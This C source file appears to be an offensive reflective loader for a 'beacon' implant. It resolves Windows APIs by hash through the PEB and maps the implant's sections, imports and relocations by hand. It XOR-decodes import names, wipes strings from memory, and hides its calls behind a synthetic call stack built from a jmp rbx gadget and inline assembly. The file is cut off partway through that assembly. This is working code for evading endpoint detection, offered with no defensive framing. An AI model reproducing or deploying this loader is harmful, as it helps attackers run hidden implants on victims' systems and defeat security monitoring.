#include "includes/projstructs.h"
#include "includes/PEB.h"
#include "includes/utils.h"
#include "includes/peb_api.h"

GRP_SEC(B) BYTE * loaded_module_base_from_hash(DWORD hash)
{
    _PEB  *peb = NULL;
    PEB_LDR_DATA *ldr = NULL;

    peb = (_PEB*) __readgsqword(0x60);
    BYTE utf8_module_base_name[256] = {0};

    LDR_DATA_TABLE_ENTRY * first_module_entry = (LDR_DATA_TABLE_ENTRY *)peb->pLdr->InLoadOrderModuleList.Flink;
    LDR_DATA_TABLE_ENTRY * this_module_entry  = first_module_entry;
    do
    {
        utf16_to_utf8(
                this_module_entry->BaseDllName.Buffer,
                (this_module_entry->BaseDllName.Length * 2),
                utf8_module_base_name
        );

        if ( hash == hash_ascii_string(utf8_module_base_name) )
        {
            return this_module_entry->DllBase;
        }
        RtlSecureZeroMemory(utf8_module_base_name,sizeof(utf8_module_base_name));
        this_module_entry = (LDR_DATA_TABLE_ENTRY *) this_module_entry->InLoadOrderLinks.Flink;
    } while (this_module_entry != first_module_entry); // list loops back to the start
    return NULL; // Did not find DLL base address
}

GRP_SEC(B) void get_sections(Dll* module)
{
    BYTE str_text[]  = { '.','t','e','x','t',0     };
    BYTE str_pdata[] = { '.','p','d','a','t','a',0 };

    for (DWORD i = 0; i < module->file_header->NumberOfSections; ++i) {
        if (MemoryCompare((BYTE*)module->section_header[i].Name, str_text, sizeof(str_text)))
        {
            module->text_section = (void*)((BYTE*)module->dllBase + module->section_header[i].VirtualAddress);
            module->text_section_size = (DWORD)module->section_header[i].SizeOfRawData;
        }
        if (MemoryCompare((BYTE*)module->section_header[i].Name, str_pdata, sizeof(str_pdata)))
        {
            module->pdata_section = (void*)((BYTE*)module->dllBase + module->section_header[i].VirtualAddress);
            module->pdata_section_size = (DWORD)module->section_header[i].SizeOfRawData;
        }
    }
}

GRP_SEC(B) void parse_module_headers(Dll* module)
{
    module->dos_header            = (PIMAGE_DOS_HEADER)module->dllBase;
    module->file_header           = (IMAGE_FILE_HEADER *)        ( (BYTE *)module->dllBase + module->dos_header->e_lfanew + 4);
    module->optional_header       = (IMAGE_OPTIONAL_HEADER64 *)  ( 0x14 + (BYTE*)module->file_header );
    module->optional_header_size  = (unsigned short)module->file_header->SizeOfOptionalHeader;
    module->section_header        = (IMAGE_SECTION_HEADER *)     ( (BYTE *)module->optional_header  + module->optional_header_size);
    module->export_directory      = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)module->dllBase + module->optional_header->DataDirectory[0].VirtualAddress);

    module->size                  = module->optional_header->SizeOfImage;
    module->SizeOfOptionalHeader  = module->optional_header_size;
    module->NumberOfSections      = module->file_header->NumberOfSections;
    module->EntryPoint            = (void*)((BYTE*)module->dllBase + module->optional_header->AddressOfEntryPoint);

    module->data_directory        = module->optional_header->DataDirectory;
    module->Export.Directory      = (void*)module->export_directory;
    module->Export.DirectorySize  = module->data_directory[0].Size;
    module->Export.AddressTable   = (void*)((BYTE*)module->dllBase + module->export_directory->AddressOfFunctions);
    module->Export.NameTable      = (void*)((BYTE*)module->dllBase + module->export_directory->AddressOfNames);
    module->Export.OrdinalTable   = (void*)((BYTE*)module->dllBase + module->export_directory->AddressOfNameOrdinals);
    module->Export.NumberOfNames  = ((DWORD)module->export_directory->NumberOfNames );

    module->import_directory_size = module->data_directory[1].Size;
    module->import_directory      = ((BYTE*)module->dllBase + module->data_directory[1].VirtualAddress);

    get_sections(module);
}



GRP_SEC(B) void * resolve_api_address_from_hash(DWORD api_hash, Dll * module)
{
    DWORD i = 0;
    DWORD* names;
    unsigned short* ordinals;
    DWORD* functions;
    BYTE* export_name;

    // Get function arrays
    names = (DWORD*)module->Export.NameTable;
    ordinals = (unsigned short*)module->Export.OrdinalTable;
    functions = (DWORD*)module->Export.AddressTable;

    // Loop over the names
    for (i = 0; i < module->Export.NumberOfNames; i++) {
        export_name = (BYTE*)(module->dllBase + names[i]);
        DWORD export_hash = hash_ascii_string(export_name);
        if (export_hash == api_hash)
        {
            return module->dllBase + functions[ordinals[i]];
        }
    }
    return 0;

}

GRP_SEC(B) void setup_synthetic_callstack(Spoof_Struct * spoof_struct)
{
    APIS api  = {0};
    Dll ntdll = {0};
    Dll k32   = {0};
    BYTE * ReturnAddress       = NULL;
    BYTE * BaseThreadInitThunk = NULL;
    BYTE * RtlUserThreadStart  = NULL;
    t_NtQueryInformationThread NtQueryInformationThread = NULL;

    ntdll.dllBase = loaded_module_base_from_hash( NTDLL    );
    k32.dllBase   = loaded_module_base_from_hash( KERNEL32 );
    parse_module_headers( &ntdll );
    parse_module_headers(  &k32  );

    api.ntdll.RtlLookupFunctionEntry      = (tRtlLookupFunctionEntry)    resolve_api_address_from_hash( RTLLOOKUPFUNCTIONENTRY   , &ntdll );
    BaseThreadInitThunk                   = (BYTE *)                     resolve_api_address_from_hash( BASETHREADINITTHUNK      , &k32   );
    RtlUserThreadStart                    = (BYTE *)                     resolve_api_address_from_hash( RTLUSERTHREADSTART       , &ntdll );
    NtQueryInformationThread              = (t_NtQueryInformationThread) resolve_api_address_from_hash( NTQUERYINFORMATIONTHREAD , &ntdll );

    // JMP RBX Gadget
    BYTE jmp_rbx_gadget[] = { 0xFF, 0x23 };
    spoof_struct->gadget_return_address    = FindGadget((LPBYTE)k32.text_section, k32.text_section_size, jmp_rbx_gadget, sizeof(jmp_rbx_gadget));
    spoof_struct->gadget_stack_frame_size  = CalculateFunctionStackSizeWrapper(spoof_struct->gadget_return_address, &api);

    // Stack Frame - BaseThreadInitThunk
    ReturnAddress = *(PVOID *)find_api_return_address_on_stack( get_runtime_function_entry_for_api( &k32 , BaseThreadInitThunk ), BaseThreadInitThunk);
    spoof_struct->frame_1_stack_frame_size = CalculateFunctionStackSizeWrapper(ReturnAddress, &api);
    spoof_struct->frame_1_return_address   = ReturnAddress;

    // Stack Frame - RtlUserThreadStart
    ReturnAddress = *(PVOID *)find_api_return_address_on_stack( get_runtime_function_entry_for_api( &ntdll , RtlUserThreadStart ), RtlUserThreadStart);
    spoof_struct->frame_0_stack_frame_size = CalculateFunctionStackSizeWrapper(ReturnAddress, &api);
    spoof_struct->frame_0_return_address   = ReturnAddress;
};

GRP_SEC(B) void * xGetProcAddress_hash(DWORD api_hash, Dll * module)
{
    Dll ntdll     = { 0 };
    ntdll.dllBase = loaded_module_base_from_hash( NTDLL );
    parse_module_headers(&ntdll);

    tNtQueryVirtualMemory NtQueryVirtualMemory = resolve_api_address_from_hash( NTQUERYVIRTUALMEMORY , &ntdll );
    void * api_address = resolve_api_address_from_hash( api_hash , module );

    MEMORY_INFORMATION_CLASS mic = { 0 };
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    long status = NtQueryVirtualMemory(NtCurrentProcess(), (PVOID)api_address, mic, &mbi, sizeof(mbi), NULL);
    if (mbi.Protect != 0x10 && mbi.Protect != 0x20 && mbi.Protect != 0x40 && mbi.Protect != 0x80)
    {
        BYTE * api_forwarder_string = (BYTE *) api_address;
        BYTE * api_name = NULL;
        BYTE dll_forwarder_name[60] = {0};
        BYTE dot = '.';
        DWORD i = 0;
        DWORD j = 0;
        for (i = 0; api_forwarder_string[i] != '.'; i++);
        api_name = api_forwarder_string + i + 1;
        for (j=0; j<=i; j++)
        {
            dll_forwarder_name[j] = (BYTE*)api_forwarder_string[j];
        }
        dll_forwarder_name[j+0] = 'd';
        dll_forwarder_name[j+1] = 'l';
        dll_forwarder_name[j+2] = 'l';

        void * module_base = xLoadLibrary(dll_forwarder_name);

        ANSI_STRING api_ansi = {0};
        Spoof_Struct spoof_struct = { 0 };
        setup_synthetic_callstack(&spoof_struct);

        t_LdrGetProcedureAddress LdrGetProcedureAddress = resolve_api_address_from_hash( LDRGETPROCEDUREADDRESS , &ntdll );
        t_RtlInitAnsiString      RtlInitAnsiString      = resolve_api_address_from_hash( RTLINITANSISTRING      , &ntdll );

        spoof_synthetic_callstack(
                &api_ansi,             // Argument # 1
                api_name,              // Argument # 2
                NULL,                  // Argument # 3
                NULL,                  // Argument # 4
                &spoof_struct,         // Pointer to Spoof Struct
                RtlInitAnsiString,     // Pointer to API Call
                (void *)0              // Number of Arguments on Stack (Args 5+)
        );
        // RtlInitAnsiString( &api_ansi, api_name );
        spoof_synthetic_callstack(
                module_base,           // Argument # 1
                &api_ansi,             // Argument # 2
                NULL,                  // Argument # 3
                &api_address,          // Argument # 4
                &spoof_struct,         // Pointer to Spoof Struct
                LdrGetProcedureAddress,// Pointer to API Call
                (void *)0              // Number of Arguments on Stack (Args 5+)
        );
        // LdrGetProcedureAddress( module_base, &api_ansi, NULL, &api_address );
    }
    return api_address;
}

GRP_SEC(B) void getApis(APIS * api){
    Dll k32   = { 0 };
    Dll ntdll = { 0 };
    ntdll.dllBase = loaded_module_base_from_hash( NTDLL    );
    k32.dllBase   = loaded_module_base_from_hash( KERNEL32 );
    parse_module_headers( &ntdll );
    parse_module_headers( &k32   );

    api->ntdll.pNtAllocateVirtualMemory     = xGetProcAddress_hash( NTALLOCATEVIRTUALMEMORY      , &ntdll  );
    api->ntdll.pNtProtectVirtualMemory      = xGetProcAddress_hash( NTPROTECTVIRTUALMEMORY       , &ntdll  );
    api->ntdll.pNtFreeVirtualMemory         = xGetProcAddress_hash( NTFREEVIRTUALMEMORY          , &ntdll  );
    api->ntdll.LdrLoadDll                   = xGetProcAddress_hash( LDRLOADDLL                   , &ntdll  );
    api->ntdll.RtlAnsiStringToUnicodeString = xGetProcAddress_hash( RTLANSISTRINGTOUNICODESTRING , &ntdll  );
    api->ntdll.LdrGetProcedureAddress       = xGetProcAddress_hash( LDRGETPROCEDUREADDRESS       , &ntdll  );
    api->ntdll.RtlFreeUnicodeString         = xGetProcAddress_hash( RTLFREEUNICODESTRING         , &ntdll  );
    api->ntdll.RtlInitAnsiString            = xGetProcAddress_hash( RTLINITANSISTRING            , &ntdll  );
    api->ntdll.NtUnmapViewOfSection         = xGetProcAddress_hash( NTUNMAPVIEWOFSECTION         , &ntdll  );
    api->ntdll.NtQueryVirtualMemory         = xGetProcAddress_hash( NTQUERYVIRTUALMEMORY         , &ntdll  );
    api->ker32.LoadLibraryExA               = xGetProcAddress_hash( LOADLIBRARYEXA               , &k32    );
    api->ker32.CreateFileMappingA           = xGetProcAddress_hash( CREATEFILEMAPPINGA           , &k32    );
    api->ker32.MapViewOfFile                = xGetProcAddress_hash( MAPVIEWOFFILE                , &k32    );
}

GRP_SEC(B) void getHeapApis(HEAP_APIS * api)
{
    Dll k32   = { 0 };
    Dll ntdll = { 0 };
    ntdll.dllBase = loaded_module_base_from_hash( NTDLL    );
    k32.dllBase   = loaded_module_base_from_hash( KERNEL32 );
    parse_module_headers( &ntdll );
    parse_module_headers( &k32   );

    api->GetProcessHeap = xGetProcAddress_hash( GETPROCESSHEAP,  &k32    );
    api->HeapFree       = xGetProcAddress_hash( HEAPFREE,        &k32    );
    api->HeapAlloc      = xGetProcAddress_hash( HEAPALLOC,       &k32    );
}

GRP_SEC(B) void * xLoadLibrary(void * library_name)
{
    DWORD hash;
    // Check if the DLL is already loaded and the entry exists in the PEBLdr
    void* LibraryAddress = (void*)loaded_module_base_from_hash(hash_ascii_string(library_name));
    // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
    if (LibraryAddress == NULL){
        APIS           api                   = { 0 };
        ANSI_STRING    ANSI_Library_Name     = { 0 };
        UNICODE_STRING UNICODE_Library_Name  = { 0 };
        Spoof_Struct   spoof_struct          = { 0 };

        setup_synthetic_callstack(&spoof_struct);

        getApis(&api);

        // Change ASCII string to ANSI struct string
        spoof_synthetic_callstack(
                &ANSI_Library_Name,            // Argument # 1
                library_name,                  // Argument # 2
                NULL,                          // Argument # 3
                NULL,                          // Argument # 4
                &spoof_struct,                 // Pointer to Spoof Struct
                api.ntdll.RtlInitAnsiString,         // Pointer to API Call
                (void *)0                      // Number of Arguments on Stack (Args 5+)
        );
        // api.RtlInitAnsiString(&ANSI_Library_Name,library_name);
        // RtlAnsiStringToUnicodeString converts the given ANSI source string into a Unicode string.
        // 3rd arg = True = routine should allocate the buffer space for the destination string. the caller must deallocate the buffer by calling RtlFreeUnicodeString.
        spoof_synthetic_callstack(
                &UNICODE_Library_Name,            // Argument # 1
                &ANSI_Library_Name,               // Argument # 2
                TRUE,                             // Argument # 3
                NULL,                             // Argument # 4
                &spoof_struct,                    // Pointer to Spoof Struct
                api.ntdll.RtlAnsiStringToUnicodeString, // Pointer to API Call
                (void *)0                         // Number of Arguments on Stack (Args 5+)
        );
        // api.RtlAnsiStringToUnicodeString( &UNICODE_Library_Name, &ANSI_Library_Name, TRUE );

        spoof_synthetic_callstack(
                NULL,                    // Argument # 1
                0,                       // Argument # 2
                &UNICODE_Library_Name,   // Argument # 3
                &LibraryAddress,         // Argument # 4
                &spoof_struct,           // Pointer to Spoof Struct
                api.ntdll.LdrLoadDll,          // Pointer to API Call
                (void *)0                // Number of Arguments on Stack (Args 5+)
        );
        // api.LdrLoadDll(NULL, 0,&UNICODE_Library_Name,&LibraryAddress);
        // cleanup
        spoof_synthetic_callstack(
                &UNICODE_Library_Name,    // Argument # 1
                NULL,                     // Argument # 2
                NULL,                     // Argument # 3
                NULL,                     // Argument # 4
                &spoof_struct,            // Pointer to Spoof Struct
                api.ntdll.RtlFreeUnicodeString, // Pointer to API Call
                (void *)0                 // Number of Arguments on Stack (Args 5+)
        );
        // api.RtlFreeUnicodeString( &UNICODE_Library_Name );
    }
    return LibraryAddress;
}
GRP_SEC(B) void xorc(ULONG_PTR length, BYTE * buff, BYTE maskkey) {
    DWORD i;
    for (i = 0; i < length; ++i)
    {
        buff[i] ^= maskkey;
    }
}

GRP_SEC(B) void doSections(Dll * virtual_beacon, Dll * raw_beacon){
    // Save .text section address and size for destination RDLL so we can make it RE later
    DWORD text_sectionFlag = FALSE;
    DWORD ObfuscateFlag   = FALSE;
    virtual_beacon->text_section = NULL;
    virtual_beacon->text_section_size = 0;
    DWORD numberOfSections = raw_beacon->file_header->NumberOfSections;
    BYTE * this_section   = add(raw_beacon->optional_header, raw_beacon->optional_header_size);
    Section section;
//    printf("Debug: Number of Sections: %d\n", numberOfSections);
    while( numberOfSections-- )
    {
//        printf("Debug: Processing section %d\n", numberOfSections);
        section.RVA = *(DWORD*)(this_section + offsetof(IMAGE_SECTION_HEADER, VirtualAddress));
//        printf("Debug: section.RVA: %p\n", section.RVA);
        section.dst_rdll_VA = add(virtual_beacon->dllBase, section.RVA);
        section.PointerToRawData = *(DWORD*)(this_section + offsetof(IMAGE_SECTION_HEADER, PointerToRawData));
//        printf("Debug: section.PointerToRawData: %p\n", section.PointerToRawData);
        section.src_rdll_VA = add(raw_beacon->dllBase, section.PointerToRawData);
        // 读取 SizeOfRawData
        section.SizeOfSection = *(DWORD*)(this_section + offsetof(IMAGE_SECTION_HEADER, SizeOfRawData));
        // check if this is the .text section
//        printf("Debug: section.SizeOfSection: %u\n", section.SizeOfSection);
        if (text_sectionFlag == FALSE)
        {
            // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
            virtual_beacon->text_section     = section.dst_rdll_VA;
            virtual_beacon->text_section_size = section.SizeOfSection;
            text_sectionFlag = TRUE;
        }
        // Copy the section from the source address to the destination for the size of the section
        memory_copy(section.dst_rdll_VA, section.src_rdll_VA, section.SizeOfSection);
//        printf("Debug: Copied section data\n");
        // Get the address of the next section header and loop until there are no more sections
        this_section += 0x28; // sizeof( IMAGE_SECTION_HEADER ) = 0x28
//        printf("Debug: Moving to next section\n");
    }
//    printf("Debug: Completed processing all sections\n");
}

GRP_SEC(B) void doImportTable(APIS * api, Dll * virtual_beacon, Dll * raw_beacon){
    void *ImportDirectory, *importEntryHint, *BaseOrdinal, *TableIndex, *nImportDesc;
    void *EntryAddress, *importNameRVA, *LookupTableEntry, *AddressTableEntry, *EntryName, *nullCheck;
    ULONG_PTR len_importName = 0;
    ULONG_PTR len_EntryName  = 0;
    PIMAGE_DOS_HEADER        raw_beacon_DOS_HEADER      = NULL;
    PIMAGE_FILE_HEADER       raw_beacon_FILE_HEADER     = NULL;
    PIMAGE_OPTIONAL_HEADER64 raw_beacon_OPTIONAL_HEADER = NULL;
    PIMAGE_DATA_DIRECTORY    raw_beacon_data_directory  = NULL;
    BYTE * importName = NULL;
    void* slphook     = NULL;
    DWORD    ImportDirectory_RVA  = 0;
    DWORD    ImportDirectory_Size = 0;
    Dll dll_import = {0};

    // Get the Image base by walking the headers
    raw_beacon_DOS_HEADER       = (PIMAGE_DOS_HEADER)raw_beacon->dllBase;
    raw_beacon_FILE_HEADER      = (PIMAGE_FILE_HEADER)(raw_beacon_DOS_HEADER->e_lfanew + (BYTE*)raw_beacon_DOS_HEADER);
    raw_beacon_OPTIONAL_HEADER  = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (BYTE*)raw_beacon_FILE_HEADER);

    // Get the raw file offset to the Data Directory located in the Optional Header
    raw_beacon_data_directory   = (PIMAGE_DATA_DIRECTORY)raw_beacon_OPTIONAL_HEADER->DataDirectory;

    ImportDirectory_RVA   = raw_beacon_data_directory[1].VirtualAddress;
    ImportDirectory_Size  = raw_beacon_data_directory[1].Size;
    ImportDirectory       = ((BYTE*)virtual_beacon->dllBase + ImportDirectory_RVA);

    nImportDesc = ImportDirectory;
    while(1)
    {
        PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)nImportDesc;
        // 检查结束条件
        if (importDescriptor->Name == 0) {
            break;
        }
        // 获取导入名称RVA
        unsigned char* dllBase = (unsigned char*)virtual_beacon->dllBase;
        unsigned int* nameRVAAddr = (unsigned int*)((unsigned char*)nImportDesc + 0xC);
        importNameRVA = (void*)(*nameRVAAddr);
        importName = (BYTE*)(dllBase + (ULONG_PTR)importNameRVA);
        RtlSecureZeroMemory(&dll_import,sizeof(Dll));
        len_importName  = (ULONG_PTR)StringLengthA(importName);
        if(raw_beacon->xor_key){
            xorc(len_importName, importName, raw_beacon->xor_key);
        }
        dll_import.dllBase   = xLoadLibrary(importName);
        stomp(len_importName, importName); // 0 out import DLL name in virtual beacon dll
        // 计算 LookupTableEntry
        unsigned int originalFirstThunk = *((unsigned int*)nImportDesc);
        LookupTableEntry = (void*)(dllBase + originalFirstThunk);

        // 计算 AddressTableEntry
        unsigned int firstThunk = *((unsigned int*)((unsigned char*)nImportDesc + 0x10));
        AddressTableEntry = (void*)(dllBase + firstThunk);
        // 获取 AddressTableEntry 的值
        nullCheck = *((void**)AddressTableEntry);
        while(nullCheck)
        {
            parse_module_headers(&dll_import);
            EntryAddress = NULL;

            if (LookupTableEntry && ((PIMAGE_THUNK_DATA)LookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                // Export Base Ordinal
                BaseOrdinal = (void*)((unsigned char*)dll_import.Export.Directory + 0x10);

                // Import Hint
                importEntryHint = (void*)((uintptr_t)LookupTableEntry & 0xFFFF);

                // Table Index
                TableIndex = (void*)((ULONG_PTR)importEntryHint - (ULONG_PTR)BaseOrdinal);

                // Entry Address (RVA)
                unsigned char* exportAddressTable = (unsigned char*)dll_import.Export.AddressTable;
                unsigned int* funcRVA = (unsigned int*)(exportAddressTable + ((ULONG_PTR)TableIndex * sizeof(DWORD)));
                EntryAddress = (void*)((unsigned char*)dll_import.dllBase + *funcRVA);

                // Patch in the address for this imported function
                *((void**)AddressTableEntry) = EntryAddress;
            }
            else
            {
                unsigned int* nameRVA = (unsigned int*)LookupTableEntry;
                EntryName = (void*)((unsigned char*)virtual_beacon->dllBase + *nameRVA + 2);
                // patch in the address for this imported function
                len_EntryName = (ULONG_PTR)StringLengthA(EntryName);
                if (EntryAddress == NULL) {
                    EntryAddress = xGetProcAddress_hash(hash_ascii_string(EntryName), &dll_import);
                }
                stomp(len_EntryName, EntryName); // 0 out import entry name in virtual beacon dll
                *((void**)AddressTableEntry) = EntryAddress;

            }
            AddressTableEntry = (void*)((unsigned char*)AddressTableEntry + sizeof(void*));
            if (LookupTableEntry) {
                LookupTableEntry = (void*)((unsigned char*)LookupTableEntry + sizeof(void*));
            }
            nullCheck = *((void**)AddressTableEntry);
        }
        nImportDesc += 0x14; // 0x14 = 20 = sizeof( IMAGE_IMPORT_DESCRIPTOR )
        __asm__( // Do this again for the next module/DLL in the Import Directory
                "xor rcx, rcx   \n"
                "add rax, 0xC   \n"  // 12(0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
                "mov ecx, [rax] \n"  // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name
                "mov rax, rcx   \n"  // RVA of Name DLL
                "add rdx, rax   \n"  // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
                : "=r" (importName),     // RDX OUT
        "=r" (importNameRVA)   // RAX OUT
                : "r" (nImportDesc),     // RAX IN
        "r" (virtual_beacon->dllBase) // RDX IN
                );
    }
}

GRP_SEC(B) void doRelocations(APIS * api, Dll * virtual_beacon, Dll * raw_beacon){
    ULONG_PTR beacon_image_base    = 0;
    ULONG_PTR BaseAddressDelta     = 0;
    PIMAGE_DOS_HEADER        raw_beacon_DOS_HEADER      = NULL;
    PIMAGE_FILE_HEADER       raw_beacon_FILE_HEADER     = NULL;
    PIMAGE_OPTIONAL_HEADER64 raw_beacon_OPTIONAL_HEADER = NULL;
    PIMAGE_DATA_DIRECTORY    raw_beacon_data_directory  = NULL;
    DWORD    BaseRelocationTable_RVA       = 0;
    DWORD    BaseRelocationTable_Size      = 0;
    void*    BaseRelocationTable           = 0;
    PIMAGE_BASE_RELOCATION this_RelocBlock = NULL;
    PIMAGE_BASE_RELOCATION this_BaseRelocation = NULL;
    DWORD this_BaseRelocation_VA = 0;
    DWORD this_BaseRelocation_SizeOfBlock = 0;
    DWORD this_relocation_RVA = 0;
    unsigned short* this_relocation = NULL;
    void* this_relocation_VA = NULL;
    DWORD this_relocBlock_EntriesCount = 0;

    // Get the Image base by walking the headers
    raw_beacon_DOS_HEADER       = (PIMAGE_DOS_HEADER)raw_beacon->dllBase;
    raw_beacon_FILE_HEADER      = (PIMAGE_FILE_HEADER)(raw_beacon_DOS_HEADER->e_lfanew + (BYTE*)raw_beacon_DOS_HEADER);
    raw_beacon_OPTIONAL_HEADER  = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (BYTE*)raw_beacon_FILE_HEADER);
    beacon_image_base               = (ULONG_PTR)raw_beacon_OPTIONAL_HEADER->ImageBase;
    // Get the Base Address difference
    BaseAddressDelta                = (ULONG_PTR)((BYTE*)virtual_beacon->dllBase - beacon_image_base);

    // Get the raw file offset to the Data Directory located in the Optional Header
    // The Data Directory has the RVAs and sizes of all the other tables & directories
    raw_beacon_data_directory   = (PIMAGE_DATA_DIRECTORY)raw_beacon_OPTIONAL_HEADER->DataDirectory;

    // Get the RVA and size of the Base Relocation Table from the Data Directory in the raw beacon DLL Optional Header
    BaseRelocationTable_RVA   = raw_beacon_data_directory[5].VirtualAddress;
    BaseRelocationTable_Size  = raw_beacon_data_directory[5].Size;

    // Setup the loop to start at the first Base Relocation block in the Base Relocation table
    BaseRelocationTable       = (void*)((BYTE*)virtual_beacon->dllBase + BaseRelocationTable_RVA);
    this_BaseRelocation = (PIMAGE_BASE_RELOCATION)BaseRelocationTable;
    this_BaseRelocation_VA               = this_BaseRelocation->VirtualAddress;
    this_BaseRelocation_SizeOfBlock      = this_BaseRelocation->SizeOfBlock;

    // Loop through and resolve all the block relocation entries in all the block relocations
    // The last block will be all zeros and that's how we know we've reached the end
    while(this_BaseRelocation->VirtualAddress != 0){
        this_relocation                  = (unsigned short*)((BYTE*)this_BaseRelocation + sizeof(IMAGE_BASE_RELOCATION));
        this_relocation_RVA              = this_BaseRelocation->VirtualAddress;
        this_BaseRelocation_SizeOfBlock  = this_BaseRelocation->SizeOfBlock;
        this_relocation_VA               = (void*)((BYTE*)virtual_beacon->dllBase + this_relocation_RVA);
        this_relocBlock_EntriesCount     = (this_BaseRelocation_SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;

        // Check that its the correct type and then write the relocation
        // Do this for all entries in the Relocation Block
//        while( this_relocBlock_EntriesCount-- )
//        {
//            __asm__(
//                    "xor r9, r9     \n"
//                    "mov r9w, [rax] \n"  // 2 byte value for the Relocation Entry (with the 4 bit type and 12 bit offset)
//                    "mov rax, r9    \n"
//                    "shr r9, 0x0C   \n"    // Check the 4 bit type
//                    "cmp r9b, 0x0A  \n"   // IMAGE_REL_BASED_DIR64?
//                    "jne badtype    \n"
//                    "shl rax, 0x34  \n"   // only keep the last 12 bits of RAX by shaking the RAX register
//                    "shr rax, 0x34  \n"   // the last 12 bits is the offset, the first 4 bits is the type
//                    "add rdx, rax   \n"    // in memory Virtual Address of our current relocation entry
//                    "mov r10, [rdx] \n"  // value of the relocation entry
//                    "add r10, rcx   \n"    // value of our relocation entry + the hardcoded Addr:Our Real in memory VA delta we calculated earlier
//                    "mov [rdx], r10 \n"  // WRITE THAT RELOC!
//                    "badtype:\n"
//                    : // no outputs
//                    : "r" (this_relocation),     // RAX IN
//            "r" (this_relocation_VA),  // RDX IN
//            "r" (BaseAddressDelta)     // RCX IN
//                    );
//            this_relocation = (unsigned short*)((BYTE*)this_relocation + 2);
//        }
        while (this_relocBlock_EntriesCount--) {
            // 提取当前重定位条目
            unsigned short relocEntry = *this_relocation;

            // 提取重定位条目的类型（高4位）和偏移量（低12位）
            unsigned short relocType = (relocEntry >> 12) & 0xF;
            unsigned short relocOffset = relocEntry & 0xFFF;

            // 检查重定位类型是否为 IMAGE_REL_BASED_DIR64
            if (relocType == IMAGE_REL_BASED_DIR64) {
                // 计算内存中当前重定位条目的虚拟地址
                BYTE* relocEntryVA = (BYTE*)this_relocation_VA + relocOffset;

                // 获取重定位条目的值
                uint64_t relocValue = *(uint64_t*)relocEntryVA;

                // 计算新的重定位值
                relocValue += BaseAddressDelta;

                // 写回新的重定位值
                *(uint64_t*)relocEntryVA = relocValue;
            }

            // 移动到下一个重定位条目
            this_relocation = (unsigned short*)((BYTE*)this_relocation + 2);
        }

// 移动到下一个基址重定位块并解析所有重定位条目
        this_BaseRelocation = (PIMAGE_BASE_RELOCATION)((BYTE*)this_BaseRelocation + this_BaseRelocation->SizeOfBlock);
        // Now move to the next Base Relocation Block and resolve all of the relocation entries
       // this_BaseRelocation = ((BYTE*)this_BaseRelocation + this_BaseRelocation->SizeOfBlock);
    }
}

GRP_SEC(B) void* checkFakeEntryAddress_returnReal(Dll * raw_beacon, Dll * virtual_beacon){
    if (raw_beacon->optional_header->LoaderFlags == 0){
        return ((BYTE*)virtual_beacon->dllBase + raw_beacon->optional_header->AddressOfEntryPoint);
    }else{
        return ((BYTE*)virtual_beacon->dllBase + raw_beacon->optional_header->LoaderFlags);
    }
}




__asm__(
        "spoof_synthetic_callstack:\n"
        "mov rax, r12\n"                      // move r12 into the volatile rax register
        "mov r10, rdi\n"                      // move rdi into the volatile r10 register
        "mov r11, rsi\n"                      // move rsi into the volatile r11 register
        "pop r12\n"                           // pop the real return address in r12
        "mov rdi, [rsp + 0x20]\n"             // &Spoof_Struct - spoof_synthetic_callstack() [rsp+0x28],    - Pointer to Spoof Struct
        "mov rsi, [rsp + 0x28]\n"             // spoof_synthetic_callstack() [rsp+0x30],    - Pointer to API Call
        // Save our original non-volatile registers. We will restore these later before returning to our implant
        "mov [rdi + 0x18], r10\n"              // Spoof_Struct.rdi
        "mov [rdi + 0x58], r11\n"              // Spoof_Struct.rsi
        "mov [rdi + 0x60], rax\n"              // Spoof_Struct.r12 ; r12 was saved to rax before clobbered
        "mov [rdi + 0x68], r13\n"              // Spoof_Struct.r13
        "mov [rdi + 0x70], r14\n"              // Spoof_Struct.r14
        "mov [rdi + 0x78], r15\n"              // Spoof_Struct.r15
        // registers rax, r10, r11 are now free to use again
        // rsp offset is now -0x8 for spoof_synthetic_callstack() args since we popped the ret into r12
        "prepare_synthetic_stack_frames:\n"
        "xor r11, r11\n"                      // r11 = loop counter
        "mov r13, [rsp + 0x30]\n"             // r13 = Number of Arguments on Stack (Args 5+)
        //"mov r14, 0x200\n"                  // r14 will hold the offset we need to push
        "xor r14, r14\n"                      // r14 will hold the offset we need to push
        "add r14, 0x08\n"
        // "add r14, [rdi + 0x80]\n"          // ThreadStartAddress  (Spoof_Struct.frame_2_stack_frame_size) stack frame size
        "add r14, [rdi + 0x38]\n"             // RtlUserThreadStart  (Spoof_Struct.frame_0_stack_frame_size) stack frame size
        "add r14, [rdi + 0x30]\n"             // jmp rbx gadget      (Spoof_Struct.gadget_stack_frame_size)  stack frame size
        "add r14, [rdi + 0x20]\n"             // BaseThreadInitThunk (Spoof_Struct.frame_1_stack_frame_size) stack frame size
        "sub r14, 0x20\n"                     // first stack arg is located at +0x28 from rsp, so we sub 0x20 from the offset. Loop will sub 0x8 each time
        "mov r10, rsp\n"
        "add r10, 0x30\n"                     // offset of stack arg added to rsp
        "loop_move_api_call_stack_args:\n"
        "xor r15, r15\n"                      // r15 will hold the offset + rsp base
        "cmp r11, r13\n"                      // comparing # of stack args added vs # of stack args we need to add
        "je create_synthetic_stack_frames\n"
        // Getting location to move the stack arg to
        "sub r14, 0x08\n"                     // 1 arg means r11 is 0, r14 already 0x28 offset
        "mov r15, rsp\n"                      // get current stack base
        "sub r15, r14\n"                      // subtract offset
        // Procuring the stack arg
        "add r10, 0x08\n"
        "push [r10]\n"
        "pop  [r15]\n"                        // move the stack arg into the right location
        // Increment the counter and loop back in case we need more args
        "add r11, 0x01\n"
        "jmp loop_move_api_call_stack_args\n"

        "create_synthetic_stack_frames:\n"
        //"sub rsp, 0x200\n"                  // Create new stack frame
